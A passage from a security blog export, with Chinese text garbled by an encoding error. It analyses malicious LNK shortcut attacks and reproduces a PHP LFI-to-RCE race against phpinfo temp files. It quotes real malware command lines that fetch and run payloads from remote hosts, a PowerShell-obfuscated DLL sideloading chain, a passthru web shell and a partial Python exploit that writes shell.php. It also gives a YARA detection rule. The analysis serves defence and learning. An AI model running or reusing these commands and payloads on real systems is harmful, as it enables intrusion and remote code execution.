RolandSkimmer 86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1 Confucius 4206ab93ac9781c8367d8675292193625573c2aaacf8feeaddd5b0cc9136d2d1 PuppetFox é€é Windows å…§å»ºçš„å·¥å…· Winrm ä¾†åŸ·è¡Œæƒ¡æ„è¡Œç‚ºï¼Œ\nå…ˆé€é cmd é–‹å•Ÿ winrmï¼Œä¸¦é€é /c ä¾†è®“ cmd åœ¨åŸ·è¡Œå¾Œé—œé–‰ï¼Œ\nstart ä½¿ç”¨æœ€å°åŒ–( /min )ã€ä¸é–‹å•Ÿæ–°è¦–çª—( /B )ä¾†å•Ÿå‹• winrmï¼Œ\nmsiexec ä½¿ç”¨ä¸é¡¯ç¤ºä»»ä½•å°è©±æ¡†æˆ– UI( /q, /qn )ï¼Œä¾†å®‰è£( /i )å¾ŒçºŒçš„ msiæª”ã€‚ å› æ­¤æ¨æ¸¬è©² C2 server å…§å®¹æ‡‰è©²å°±æ˜¯ä¸€å€‹æƒ¡æ„çš„ msi æª”ã€‚\nåœ¨ cmd ä¸­è¼¸å…¥ msiexec /?, start /?, cmd /? å¯æŸ¥çœ‹æ‰€æœ‰ç›¸é—œ / æŒ‡ä»¤æ‡‰ç”¨ã€‚\nCommand line arguments:\ncmd.exe /c \u0026#34;\u0026#34;C:\\Windows\\System32\\winrm.cmd\u0026#34; \u0026amp; start /min /b msiexec\u0026amp;\u0026amp; start /min /B msiexec /q /i http://154.201.83.175:3989/@ /qn\u0026#34; RolandSkimmer é€é mshta.exe ä¾†åŸ·è¡Œå¾ŒçºŒæƒ¡æ„ VBScript è…³æœ¬ï¼Œ\né€é createobject å»ºç«‹ä¸€å€‹ mi1 ç‰©ä»¶ï¼Œ\næ¥è‘—é€éè©²ç‰©ä»¶å‘ C2 ç™¼é€ GET è«‹æ±‚ï¼Œ\nä¸¦æ›¿æ›æ”¶åˆ°çš„å›æ‡‰ä¸­çš„ # æ”¹ç‚ºéš¨æ©Ÿæ•¸ä¸¦åŸ·è¡Œï¼Œ\nå›æ‡‰çš„éƒ¨åˆ†æ‡‰è©²å°±æ˜¯å…·é«”çš„æƒ¡æ„è¡Œç‚ºäº†ã€‚\nè€Œæˆ‘å€‘èƒ½ç™¼ç¾åˆ°å®ƒæœ‰å®šç¾©ä¸€å€‹éš¨æ©Ÿæ•¸çš„éƒ¨åˆ†ï¼Œ\né€éæŸ¥çœ‹ VT å¯ä»¥åœ¨ Contacted URLs ä¸­ç™¼ç¾åˆ°æœ‰è¨±å¤šçš„ URLï¼Œ\nå¤§å¤šéƒ½åªæ˜¯ V å€¼ä¸åŒï¼Œ\nå› æ­¤æ¨æ¸¬æ”¶åˆ°çš„å›æ‡‰å…§å®¹æ‡‰è©²å°±åŒ…å«é€™éƒ¨åˆ†V=#ã€‚\nCommand line arguments:\n\u0026#34;C:\\wINdOwS\\SySTeM32\\MsHTa.eXe\u0026#34; vbscript:execute(\u0026#34;set mi1=createobject(\u0026#34;\u0026#34;msxml2.serverxmlhttp.6.0\u0026#34;\u0026#34;): mi1.open \u0026#34;\u0026#34;get\u0026#34;\u0026#34;,\u0026#34;\u0026#34;http://invsetmx.com/ipa.aspx\u0026#34;\u0026#34;,false: mi1.send(): randomize: r=int(rnd*99999): execute(replace(mi1.responsetext,\u0026#34;\u0026#34;#\u0026#34;\u0026#34;, r)):\u0026#34;) (WiNdOW.ClOsE) Confucius å…ˆå°‡æœ¬æ©Ÿåˆæ³•ç¨‹å¼ fixmapi.exe è¤‡è£½åˆ° AppData\\Local\\BlueAle.exeï¼Œ\næ¥è‘—åŸ·è¡Œæ··æ·†éå¾Œçš„æŒ‡ä»¤ï¼Œè§£æ··æ·†å¾Œå¯ä»¥å¾—å‡ºä¸‹åˆ—å…§å®¹ï¼Œ\nå¯ä»¥çœ‹åˆ°å» C2 ä¸‹è¼‰ä¸€å€‹ dllï¼Œç„¶å¾Œå†ä¸‹è¼‰ä¸€å€‹ file.pdf å„²å­˜åœ¨ tmp è³‡æ–™å¤¾ï¼Œ\næœ€å¾Œå‰‡æ˜¯å»é–‹å•Ÿè©² pdfï¼Œç„¶å¾Œç¡äº”ç§’å¾Œå»åŸ·è¡Œ BlueAle.exeï¼Œ\né€™é‚Šä½¿ç”¨åˆ°äº† dll sideloading çš„æŠ€å·§ä¾†é‹è¡Œæƒ¡æ„ dllã€‚\nCommand line arguments:\n\u0026#34;powershell.exe\u0026#34; -C \u0026#34;$pa=$env:LocalAppData; $c=$pa+\u0026#39;\\BlueAle.exe\u0026#39;; Copy C:\\Windows\\System32\\fixmapi.exe $c; 437,455,452,446,370,383,449,370,378,374,450,435,370,381,370,377,430,447,435,450,443,453,454,455,436,384,438,446,446,377,379,370,372,442,454,454,450,453,396,385,385,450,439,454,452,443,437,441,452,439,439,448,384,443,448,440,449,385,420,418,426,408,406,389,394,425,403,418,420,393,384,452,445,449,372,397,374,444,399,374,439,448,456,396,422,415,418,370,381,370,377,430,440,443,446,439,384,450,438,440,377,397,370,437,455,452,446,370,383,449,370,374,444,370,372,442,454,454,450,453,396,385,385,450,439,454,452,443,437,441,452,439,439,448,384,443,448,440,449,385,404,425,416,395,428,403,418,384,452,445,449,372,397|%{$x+=[char]($_-338)}; $x|IEX; start $j; Start-Sleep -Seconds 5; start $c\u0026#34; è§£æ··æ·†ä¸­é–“çš„å…§å®¹:\ncurl -o ($pa + \u0026#39;\\mapistub.dll\u0026#39;) \u0026#34;https://petricgreen.info/RPXFD38WAPR7.rko\u0026#34;; $j=$env:TMP + \u0026#39;\\file.pdf\u0026#39;; curl -o $j \u0026#34;https://petricgreen.info/BWN9ZAP.rko\u0026#34;; Scanned-Doc-t00778886867-QUO.LNK #\råœ¨é€™å€‹æ¡ˆä¾‹ä¸­æ¯”è¼ƒå€¼å¾—ä¸€æçš„æ˜¯ï¼Œ\nä¸¦éä½¿ç”¨å¸¸è¦‹çš„ C2 ä¾†å­˜æ”¾æƒ¡æ„è»Ÿé«”ï¼Œ\nè€Œæ˜¯é€éé›²è¨—ç®¡æœå‹™ä¾†å­˜æ”¾æƒ¡æ„è»Ÿé«”ï¼Œ\nåœ¨è³‡å®‰å¤§æœƒçš„å…¶ä»–å ´è­°ç¨‹ä¸­ä¹Ÿæœ‰æåŠåˆ°ï¼Œ\nç¾åœ¨é€™ç¨®ä½¿ç”¨ç¬¬ä¸‰æ–¹å…è²»æœå‹™çš„æ”»æ“Šè¶Šä¾†è¶Šå¤šï¼Œ\nè€Œä¸”ä¹Ÿèƒ½åœ¨é€²è¡Œå®Œæ”»æ“Šå¾Œå°±åˆªé™¤ï¼Œä½¿ç ”ç©¶å“¡é›£ä»¥æŸ¥è©¢ã€‚\nè€Œæˆ‘ä¹Ÿæœ‰æ‰¾åˆ°ä¸€äº›è©² LNK çš„è®Šé«”ï¼Œ\nå¯ä»¥ç™¼ç¾åˆ°ä»–å”¯ä¸€çš„å·®åˆ¥éƒ½åªæœ‰ä½¿ç”¨ä¸åŒçš„é›²è¨—ç®¡æœå‹™ï¼Œ\nå…¶ä»–çš„ä¸è«–æ˜¯æª”æ¡ˆåç¨±æˆ–æ˜¯æ”»æ“Šå…§å®¹å‰‡éƒ½æ˜¯ç›¸åŒçš„ã€‚\nCommand line arguments:\npowershell -WindowStyle hidden -Command (new-object System.Net.WebClient).DownloadFile(\u0026#39;\u0026#39;https://link.storjshare.io/raw/jvkur67ttk7yuzdriwaa3ufnlwra/my-newupload/newfile.txt\u0026#39;\u0026#39;,\u0026#39;\u0026#39;C:\\\\ProgramData\\\\HEW.GIF\u0026#39;\u0026#39;); $file = \u0026#39;\u0026#39;C:\\\\ProgramData\\\\HEW.GIF\u0026#39;\u0026#39;; [System.Convert]::FromBase64String((Get-Content $file)) | Set-Content C:\\\\ProgramData\\\\CHROME.PIF -Encoding Byte; start C:\\\\ProgramData\\\\CHROME.PIF;\u0026#39; Hash:\nScanned-Doc-t00778886867-QUO.LNK 3107d53f9e37c496f08e3742c379976a80f7297c192aba5b8eb7c5f29af18f33 Embedziplnk #\råœ¨é€£çµä¸­åµŒå…¥ zip è€Œéå…ˆå‰æåŠåˆ°çš„ exeï¼Œ\nä½†æ•´é«”é‚è¼¯ä»ä¸€æ¨£ã€‚\nä¸€æ¨£éæ­·ç•¶å‰ç›®éŒ„çš„æ‰€æœ‰æª”æ¡ˆæ‰¾å‡ºè©² lnk æª”ï¼Œ\nç„¶å¾ŒæŠŠ zip å­˜æ”¾åˆ° tmp ä¸­ï¼Œè§£å£“ç¸®ä¸¦åŸ·è¡Œå…¶ä¸­çš„æƒ¡æ„è»Ÿé«”ã€‚\nå»æŸ¥çœ‹è©²æª”æ¡ˆçš„åå…­é€²åˆ¶æ ¼å¼ï¼Œé€éè§€å¯Ÿæœ«ç«¯å…§å®¹çš„ Header ï¼Œ\nç™¼ç¾ä»–å°±æ˜¯æ­£å¸¸ zip file çš„ headerï¼Œä¸¦æ²’æœ‰åšåŠ å¯†ä¹‹é¡çš„ï¼Œ\nè€Œæˆ‘å€‘ç°¡å–®å¯«ä¸€å€‹æå–è…³æœ¬å‡ºä¾†ï¼Œ\nç™¼ç¾æœ«ç«¯å°±çœŸçš„æ˜¯ zip æª”æ¡ˆï¼Œè§£å£“ç¸®å¾Œä¹Ÿæœ‰å¾ŒçºŒæ”»æ“Šæåˆ°çš„ 5.9.82.114.exeã€‚\nCommand line arguments:\npowershell -windowstyle hidden $jhelpfule=[system.io.file]::ReadAllBytes((dir *.lnk ^| ? {$_.length -ge 00202000} ^| select -ExpandProperty FullName)); $oprototypez = \u0026#39;\u0026#39;%LOCALAPPDATA%\\tmp\u0026#39;\u0026#39; + (Get-Random) + \u0026#39;\u0026#39;.zip\u0026#39;\u0026#39;; $oprototypez = [Environment]::ExpandEnvironmentVariables($oprototypez); $vplanz = [System.IO.Path]::GetDirectoryName($oprototypez); [System.IO.File]::WriteAllBytes($oprototypez, $jhelpfule[ 3478..($jhelpfule.length)]); cd $vplanz;Expand-Archive $oprototypez . -EA 0 -Force ^| Out-Null; del $oprototypez -EA 0 -Force ^| Out-Null; ^\u0026amp; .\\5.9.82.114.exe\u0026#39; Hash:\n[Embedexelnk] Court order No.RY4577-71 (mandatory to comply 4a07b3fbfd385f067e892a385d63667ba9a6d89f9d49f3736de84c94282e28e5 é é˜²èˆ‡é˜²æ²» #\ræˆ‘å€‘é€éå»å­¸ç¿’äº† LNK file çš„çµæ§‹ï¼Œ\nä»¥åŠä¸Šè¿°çš„å¯¦ä¾‹åˆ†æï¼Œ\nå¤šå°‘èƒ½æ‰¾åˆ°ä¸€äº›æƒ¡æ„é€£çµçš„ç‰¹å¾µï¼Œ\nå› æ­¤ä»¥ä¸‹æ˜¯ä¸€äº›æˆ‘èªç‚ºèƒ½å¤ ä½œç‚ºå¯¦éš›é é˜²æ‰‹æ®µçš„æ–¹å‘ã€‚\nçµæ§‹ #\rçœ‹åˆ°é€™è£¡ï¼Œæˆ‘å€‘å·²ç¶“å­¸ç¿’åˆ°äº†åŸºæœ¬çš„ LNK file çš„çµæ§‹ï¼Œ\nä¸¦ä¸”ä¹Ÿé€²è¡Œäº†ä¸€äº›å¯¦ä¾‹åˆ†æå¾Œï¼Œ\næˆ‘å€‘ä¹Ÿå¤§è‡´èƒ½å¾é€™äº›æ¡ˆä¾‹åˆ†æä¸­æ‰¾åˆ°ä¸€äº›è¦å¾‹ï¼Œ\nä¹Ÿå› æ­¤å°±èƒ½å¤ å»æ ¹æ“šé€™éƒ¨åˆ†çš„æ¦‚å¿µä¾†æ’°å¯«ä¾‹å¦‚ yara rule æˆ–æ˜¯å…¶ä»–æª¢æ¸¬å·¥å…·çš„åµæ¸¬æ©Ÿåˆ¶ã€‚\nä¾‹å¦‚æˆ‘å€‘åœ¨ä¸Šè¿°å­¸ç¿’ Embedexelnk çš„æ™‚å€™å¯ä»¥ç™¼ç¾ä»–éƒ½æœ‰ PreferEnvironmentPath çš„å…§å®¹ï¼Œ\nå› æ­¤æˆ‘å€‘å°±èƒ½å¯«ä¸€å€‹æ¢ä»¶æ˜¯ï¼Œåœ¨ LinkFlags ä¸­å­˜åœ¨ PreferEnvironmentPath å°±å¯ä»¥æ¨™è¨˜ç‚ºå¯ç–‘ä¹‹é¡çš„ã€‚\nyara rule ç°¡å–®ç¯„ä¾‹:\nrule LNK_PreferEnvironmentPath {\rcondition:\r(uint32(0x14) \u0026amp; 0x00002000) != 0\r} ç•¶ç„¶ä¹Ÿä¸æ˜¯é™å®šèªªåªæœ‰é€™ä¸€å€‹é …ç›®ï¼Œä½†å‰©ä¸‹çš„å°±æ­¡è¿å„ä½å»è‡ªå·±ç ”ç©¶å¾Œå†ä¾†åˆ¤è®€äº†ã€‚\nåˆæˆ–æ˜¯æˆ‘å€‘ä¹Ÿèƒ½ä½¿ç”¨æ©Ÿå™¨å­¸ç¿’çš„æ–¹å¼ä¾†è¾¦åˆ¥ï¼Œ\nä¾‹å¦‚é€éæª¢æ¸¬ LNK æª”ä¸­ LinkFlags ä¸­çš„æ‰€æœ‰é …ç›®ï¼Œç”¨ä¾†å»ºç«‹ä¸€å€‹é …ç›®è¡¨ä¹‹é¡çš„ï¼Œ\nå†ä¸Ÿçµ¦æ¨¡å‹å»è¨“ç·´è®“ä»–åˆ¤è®€ï¼Œ\né€™éƒ¨åˆ†æœªä¾†å¦‚æœæœ‰æ©Ÿæœƒçš„è©±æˆ‘æ‡‰è©²æœƒå»å¯¦ä½œï¼Œ\nåˆæˆ–æ˜¯ä½ æœ‰å…¶ä»–æƒ³æ³•æˆ–æ˜¯æƒ³ä¸€èµ·è£½ä½œçš„è©±ä¹Ÿèƒ½ä¾† DM æˆ‘ä¸€èµ·è¨è«–ä¹‹é¡çš„ã€‚\nç³»çµ± #\ré€™éƒ¨åˆ†ä¸»è¦æ˜¯æˆ‘èªç‚ºç¾è¡Œçš„ LNK æª”è©²å¦‚ä½•é é˜²ï¼Œ\nä»¥åŠå°æ–¼æœªä¾†ç³»çµ±å»ºè­°çš„æ”¹è‰¯æ–¹å‘\u0026hellip;?\næˆ‘å€‘å¯ä»¥é€éæª”æ¡ˆç¸½ç®¡æŸ¥çœ‹é …ç›®é¡å‹ï¼Œåœ¨é …ç›®é¡å‹æœƒæ˜ç¢ºé¡¯ç¤ºå‡º æ·å¾‘ï¼Œ\né€™å¤§æ¦‚æœƒæ˜¯æ¯”è¼ƒæ˜ç¢ºæŒ‡å‡ºé€™æ˜¯ LNK æª”çš„æœ€å¤§è·¡è±¡ï¼Œ\næ‰€ä»¥å¦‚æœçœŸçš„æ˜¯éœ€è¦å»é–‹å•Ÿä¸€äº›å¥‡æ€ªæª”æ¡ˆçš„æ™‚å€™ï¼Œ\nå»ºè­°å¯ä»¥åœ¨æª”æ¡ˆç¸½ç®¡è™•å…ˆå»è©³ç´°ç¢ºèªä¸€ä¸‹æª”æ¡ˆé¡å‹ã€‚\nè€Œ LNK æª”é‚„æœ‰ä¸€å¤§ç‰¹å¾µå°±æ˜¯ä»–çš„ Icon å·¦ä¸‹è§’æœ‰ä¸€å€‹ç®­é ­ç¬¦è™Ÿï¼Œ\né›–ç„¶æœ‰é¡¯ç¤ºï¼Œä½†ä¸å¤šï¼Œç•¢ç«Ÿç¾åœ¨äººå‡è€èŠ±(X\nè€Œä¸”å¤§å¤šäººä¹Ÿä¸æœƒå»ç‰¹åˆ¥æŸ¥çœ‹ Icon çš„è§’è½ä¹‹é¡çš„ï¼Œ\nå› æ­¤æˆ‘èªç‚ºç›´æ¥æ”¾å¤§é‚£å€‹ç®­é ­ï¼Œåˆæˆ–æ˜¯æ–°å¢å…¶ä»–èƒ½å¤ å€åˆ¥ Icon çš„æ–¹å¼ã€‚\næœ€å¾Œå‰‡æ˜¯æ–°å¢é¡¯ç¤º .lnk å­—å°¾ï¼Œé›–ç„¶ä¸¦éæ‰€æœ‰ä½¿ç”¨è€…éƒ½æœƒé–‹å•Ÿé¡¯ç¤ºå‰¯æª”åï¼Œ\nä½†æˆ‘èªç‚ºå¦‚æœèƒ½ç›´æ¥é¡¯ç¤ºå‡º .lnk çµå°¾çš„è©±å¤šå°‘ä¹Ÿèƒ½èµ·åˆ°ä¸€äº›é˜²è­·åŠŸèƒ½ã€‚\nç¸½çµ #\ré€™ç¨®é€é LNK æª”çš„æ”»æ“Šæ‰‹æ®µåœ¨å¾ˆæ—©ä¹‹å‰å°±å‡ºç¾éäº†ï¼Œ\næˆ‘èªç‚ºé™¤éå¾®è»Ÿæœ‰æ‰“ç®—å¤§æ”¹ä»–å€‘çš„ç³»çµ±ï¼Œ\nå¦å‰‡é€™ç¨®é¡å‹çš„æ”»æ“Šåœ¨æœªä¾†ä¹Ÿä»ç„¶æœƒååˆ†å¸¸è¦‹ï¼Œ\nå› æ­¤é¤Šæˆä¸€å€‹ä¸è¦äº‚é»å¥‡æ€ªæª”æ¡ˆçš„ç¿’æ…£æ‰æ˜¯ä¸€å€‹æ­£ç¢ºçš„ç¶²è·¯å…¬æ°‘å–”ï¼\nç¬‘æ­» é€™ç”šéº¼è¶…çˆ›çš„å°å­¸ä½œæ–‡çµå°¾ï¼Œ\næ„Ÿè¬æ‰€æœ‰é¡˜æ„çœ‹åˆ°é€™è£¡çš„äººï¼Œ\næˆ‘çŸ¥é“æˆ‘æ–‡ç« æ’ç‰ˆæ»¿é†œçš„\u0026gt;\u0026lt;\næœ‰ä»»ä½•ç–‘å•æˆ–æ˜¯å»ºè­°éƒ½å¯ä»¥å’Œæˆ‘èªªã€‚\nè‡³æ­¤ï¼Œè—è¡“å·²æˆ\råƒè€ƒä¾†æº #\rHow to use Shortcut LNK Files on Windows - Malware Delivery Initial Access\nEmbedExeLnk - åœ¨LNKå†…åµŒå…¥EXEå¹¶è‡ªåŠ¨æ‰§è¡Œ d4rkiZ/EmbedExeLnk\n","date":"6 May 2025","externalUrl":null,"permalink":"/posts/013_lnkresearch/","section":"Posts","summary":"åˆ†æäº† LNK file æ˜¯å¦‚ä½•è¢«ç”¨ä½œæ”»æ“Šï¼Œä¸¦ç°¡å–®ä»‹ç´¹äº† LNK çš„çµæ§‹ï¼Œä»¥åŠç›¸é—œæ”»æ“Šæ‰‹æ³•ã€ä¸¦åˆ†ææƒ¡æ„ç¨‹å¼ï¼Œæœ€å¾Œèªªæ˜è©²å¦‚ä½•é é˜²","title":"ç•¶é€£çµæˆç‚ºé§­å®¢åˆ©å™¨ï¼šåˆ†æLNKæ”»æ“Šèˆ‡é˜²ç¦¦æŠ€å·§","type":"posts"},{"content":"","date":"30 December 2024","externalUrl":null,"permalink":"/tags/php/","section":"Tags","summary":"","title":"PHP","type":"tags"},{"content":"\ræ“šèªªæ˜¯ä¸€å€‹phpä¸Šçš„ç¶“å…¸è€æ´(?\rå‰å‰è¨€ #\rç”±æ–¼è‡ªå·±é›»è…¦ç’°å¢ƒä¸€ç›´ç„¡æ³•é †åˆ©åŸ·è¡ŒæˆåŠŸï¼Œå› æ­¤æœ€å¾Œå°±æ”¾æ£„æ­¤æ¼æ´çš„å¯¦ä½œï¼Œ\nä½†æ–‡ç« æ‰“éƒ½æ‰“äº†ï¼Œä¸ç™¼ä¹Ÿæ˜¯ç™½æ‰“ï¼Œ\næ‡‰è©²æ˜¯æˆ‘è‡ªå·±é›»è…¦çš„å•é¡Œï¼Œæ­¡è¿å¤§å®¶ä¹Ÿå»å˜—è©¦çœ‹çœ‹èƒ½å¦æˆåŠŸï¼Œ\næˆ–æ˜¯ä¾†ç§è¨Šè·Ÿæˆ‘è¨è«–ï¼Œè¬è¬å¤§å®¶ã€‚\nå‰è¨€ #\ræœ‰å¹¸åƒèˆ‡äº†å°ç£å¥½å²é§­é‚€è«‹æ¥­ç•ŒçŸ¥åå¤§ç¥ orange æ‰€èˆ‰è¾¦çš„Web Security è¼•é¬†è«‡ï¼Œæœ¬æ¬¡èª²ç¨‹çœŸçš„å—ç›Šè¨±å¤šï¼ŒçœŸçš„å¾ˆæ¨è–¦æ‰€æœ‰æœ‰åƒåŠ å°ç£å¥½å²é§­çš„éƒ½å¯ä»¥å»å ±åï¼Œå¥½å»æ„›å» æ˜å¹´é‚„å»(X\nç¸½ä¹‹åœ¨èª²ç¨‹ä¸­æœ‰æåˆ°åœ¨phpä¸­æœ‰å€‹LFIçš„æ¼æ´ï¼Œåœ¨è½å®Œæ•˜è¿°é‚„æœ‰ç¨å¾®å¯¦éš›æ“ä½œå¾Œæ„Ÿåˆ°æ»¿æœ‰èˆˆè¶£çš„ï¼Œå› æ­¤æƒ³èªªèª²å¾Œè¦ä¾†è‡ªå·±å¯¦éš›æ“ä½œä¸€æ¬¡è©²æ¼æ´ï¼Œæ–¼æ˜¯å°±æœ‰æœ¬ç¯‡äº†\næœ¬æ¬¡ä¸€æ¨£æœ‰å°‡å¾©ç¾å…§å®¹æ”¾åœ¨æˆ‘å€‹äººçš„githubä¸Šï¼Œæ­¡è¿å¤§å®¶ä¸€èµ·è·Ÿè‘—å¯¦éš›æ“ä½œçœ‹çœ‹\nBetan423/LFI-With-PHPInfo-PoC\rnull 0\r0\ræ¼æ´ä»‹ç´¹ #\råœ¨ php çš„é…ç½®æ–‡ä»¶ä¸­ï¼Œé è¨­äº†ä¸€é … file_uploads = on ï¼Œè€Œè©²è¨­å®šå‰‡æœƒå°è‡´ä¸€å€‹ç¥å¥‡çš„ç‰¹æ€§ï¼Œ\nå³ä½¿åœ¨é é¢ä¸­ï¼Œæ²’æœ‰è¨­æœ‰æ¥æ”¶è¼¸å…¥å€¼çš„éƒ¨åˆ†ï¼Œä¾‹å¦‚å–®ç´”çš„ phpinfo() ä»‹é¢ï¼Œ\nä½†å¦‚æœä»ç™¼é€å…§å®¹éå»ï¼Œ php ä¸¦ä¸æœƒç„¡è¦–é€™äº›å…§å®¹ï¼Œè€Œæ˜¯æœƒå°‡å…¶ä½œç‚ºæš«å­˜æª”å„²å­˜ï¼Œ\nç›´åˆ°æ•´å€‹è¦æ±‚å®Œæ•´è·‘å®Œå¾Œï¼Œè‹¥éƒ½æ²’æœ‰å­˜å–åˆ°å‰›å‰›è¼¸å…¥çš„å…§å®¹ï¼Œå‰‡æ‰æœƒå°‡å‰›å‰›å‚³å…¥çš„å…§å®¹åˆªé™¤ã€‚\nå¦‚æœåªæ˜¯é€™æ¨£é‚„æ²’æœ‰å¤ªå¤§çš„å•é¡Œï¼Œå› ç‚ºæš«å­˜æª”çš„æª”åéƒ½æ˜¯éš¨æ©Ÿç”¢ç”Ÿçš„ï¼Œ\n(ä¾‹å¦‚åœ¨Windowsä¸­çš„å‹å¼æ˜¯php****.tmp)\nä½†åœ¨ phpinfo ä¸­ï¼Œå»æœƒé¡¯ç¤ºå‡ºæ‰€æœ‰æ¥å—åˆ°çš„å€¼ï¼Œä¸¦å°‡ä»–å€‘çš„è³‡è¨Šéƒ½åˆ—å‡ºä¾†ï¼Œ\n(ä¾‹å¦‚æª”åã€è·¯å¾‘ç­‰ï¼Œä¸‹æ–¹å¾©ç¾çš„éƒ¨åˆ†æœ‰ä¾‹åœ–)\nä¹Ÿå› æ­¤å°±æœƒå°è‡´å…ˆå‰å‚³é€çš„æš«å­˜æª”æª”åleakï¼Œ\nè€Œæˆ‘å€‘é€™æ™‚å°±èƒ½é€éLFIçš„æ¼æ´å»å­˜å–åˆ°å‰›å‰›å‚³å…¥çš„æƒ¡æ„payloadï¼Œ\næœ€å¾Œä»¥æ­¤ä¾†é”åˆ°RCEçš„æ•ˆæœã€‚\nå¾©ç¾ #\rå¾©ç¾é‚è¼¯ #\ræˆ‘å€‘é€éå‘ä¼ºæœå™¨å‚³é€ä¸€å€‹å…¶ä¸­å¸¶æœ‰æƒ¡æ„ payload çš„ request ï¼Œ\nä¸¦ä¸”åœ¨è©² request ä¸­æ·»åŠ å¤§é‡çš„Aä¾† padding ï¼Œç”¨æ„æ˜¯ç‚ºäº†è®“ç¶²é è™•ç†è©²å°åŒ…æ™‚é€Ÿåº¦è®Šæ…¢ï¼Œ\nå› ç‚ºæˆ‘å€‘ä¸Šè¿°æœ‰æåˆ°èªªåœ¨è©²è¦æ±‚é‹è¡ŒçµæŸå¾Œï¼Œè‹¥æ˜¯æ²’æœ‰å­˜å–åˆ°å‰›å‰›å‚³å…¥çš„å…§å®¹ï¼Œå‰‡æœƒå°‡å…¶åˆªæ‰ï¼Œ\nå› æ­¤æˆ‘å€‘é€éå¡«å……å¤§é‡å­—å…ƒï¼Œä¾†æ¸›ç·©ä¼ºæœå™¨è™•ç†è©²å°åŒ…çš„é€Ÿåº¦ï¼Œä»¥ä¾¿è®“æˆ‘å€‘ä¾†å¾—åŠå»å­˜å–å‰›æ‰å‚³å…¥çš„ payload ï¼Œ\næœ€å¾Œé€éLFIæ¼æ´ä¾†å­˜å–å‰›å‰›è¼¸å…¥çš„ payload ï¼Œå³å¯é †åˆ© RCE ã€‚\næš«å­˜æª” #\ræˆ‘å€‘ä¸€é–‹å§‹å…ˆé€é burp suite ï¼Œåœ¨ phpinfoçš„ä»‹é¢ä¸­éš¨ä¾¿ç™¼é€ä¸€å€‹å…§å®¹ï¼Œ\n(è¨˜å¾—å°‡ http request æ”¹æˆ POST) åœ¨è©²é é¢ä¸­ï¼Œæ˜¯æ²’æœ‰ä»»ä½•æœƒæ¥æ”¶è¼¸å…¥å€¼çš„å…§å®¹ï¼Œ\nä½†æˆ‘å€‘é€éæŸ¥è©¢ phpinfo ä»‹é¢ï¼Œ\nå»æœƒç™¼ç¾ä»–ä»ç„¶æœ‰å°‡æˆ‘å€‘å‰›å‰›æ‰€å‚³é€çš„å…§å®¹ï¼Œ\nä¿å­˜åœ¨ php87F2.tmp ä¸­ã€‚ è©²æš«å­˜æª”å…·é«”å…§å®¹çœŸçš„æ˜¯å‰›å‰›æ‰€å‚³é€çš„å…§å®¹å—ï¼Ÿ\næˆ‘å€‘é€™é‚Šå¯«ä¸€å€‹è…³æœ¬ä¾†æŸ¥çœ‹è©²æš«å­˜æª”ï¼Œ\nå¯ä»¥ç™¼ç¾åˆ°ï¼Œå…¶ä¸­çœŸçš„å°±æ˜¯æˆ‘å€‘å‰›å‰›æ‰€è¼¸å…¥çš„testã€‚\n(è…³æœ¬æœ‰æ™‚å€™æœƒæŠ“ä¸åˆ°tmpæª”ï¼Œå¤šè©¦å¹¾æ¬¡å°±å¯ä»¥äº†) ä¸çŸ¥é“å„ä½çœ‹åˆ°é€™è£¡æœƒä¸æœƒå¥½å¥‡ä¸€ä»¶äº‹ï¼Œ\nç›´æ¥å»å­˜å–tmpæª”æ¡ˆå°±èƒ½é †åˆ©åŸ·è¡Œæƒ¡æ„ä»£ç¢¼äº†å—ï¼Ÿ\nå› æ­¤æˆ‘å€‘é€™é‚Šå…ˆä¾†åšå€‹å°å¯¦é©—ï¼Œé€éåœ¨ä¼ºæœå™¨åŒç›®éŒ„ä¸‹å»ºç«‹ä¸€å€‹ phpTEST.tmp ï¼Œ\nä¸¦å°‡å…¶ä¸­å…§å®¹å»ºç«‹ç‚ºç°¡å–®çš„ php çš„ web shellï¼Œ\n\u0026lt;?php passthru($_GET[\u0026#34;f\u0026#34;]);?\u0026gt; è€Œå¯¦éš›å»å­˜å–è©²æª”æ¡ˆå¯ä»¥çœ‹åˆ°ï¼Œå·²ç¶“æ˜¯é †åˆ©åŸ·è¡Œ web shell çš„å…§å®¹äº†ï¼Œ\nä¹Ÿå› æ­¤æˆ‘å€‘å¾ŒçºŒå¦‚æœæˆåŠŸå°‡ web shell å¯«å…¥æš«å­˜æª”å¾Œï¼Œåªéœ€è¦ç›´æ¥å»å­˜å–è©²æª”æ¡ˆå°±èƒ½é †åˆ©é‹è¡Œäº†ã€‚\nLFI to RCE #\ræˆ‘å€‘é€é socket ä¾†ä¸æ–·å° phpinfo ç™¼é€å¤§é‡å°åŒ…ï¼Œä»¥é”åˆ°æ¸›ç·©ä¼ºæœå™¨åˆªé™¤tmpæª”æ¡ˆé€Ÿåº¦ï¼Œ\nä¸¦åœ¨è®€å–é€å›å…§å®¹æ™‚é€²è¡Œå¿«é€Ÿè®€å–ï¼Œ\nä»¥ä¾¿åœ¨æŸ¥æ‰¾åˆ° tmp æª”çš„ç¬¬ä¸€æ™‚é–“å°±é€é LFI æ¼æ´å»å­˜å–è©² web shellï¼Œ æœ€çµ‚å°±æˆåŠŸé †åˆ©æ¤å…¥ web shellã€‚\nåœ¨ github repo ä¸­ï¼Œans001 èˆ‡ ans002 ç‚ºåˆ¥äººæ’°å¯«çš„ poc è…³æœ¬ï¼Œå¯ä»¥ä¸€èµ·å˜—è©¦çœ‹çœ‹æ˜¯å¦èƒ½é †åˆ©é‹è¡Œã€‚\nimport socket import threading # è¨­å®šrequest def setup(host,port): padding = \u0026#34;A\u0026#34; * 5000 TAG = \u0026#34;Security Test\u0026#34; PAYLOAD = \u0026#34;\u0026#34;\u0026#34;%s\\r \u0026lt;?php $c=fopen(\u0026#39;shell.php\u0026#39;,\u0026#39;w\u0026#39;);fwrite($c,\u0026#39;\u0026lt;?php passthru($_GET[\u0026#34;f\u0026#34;]);?\u0026gt;\u0026#39;);?\u0026gt;\\r\u0026#34;\u0026#34;\u0026#34; % TAG # è«‹æ±‚çš„æ­£æ–‡éƒ¨åˆ† body = f\u0026#34;\u0026#34;\u0026#34; ------WebKitFormBoundaryfHfyAsoxPPUAHIAj\\r Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;test.txt\u0026#34;\\r Content-Type: text/plain\\r \\r {PAYLOAD} \\r ------WebKitFormBoundaryfHfyAsoxPPUAHIAj--\\r \u0026#34;\u0026#34;\u0026#34; # è¨ˆç®— Content-Length content_length = len(body) # çµ„å»º HTTP Request TMPrequest = 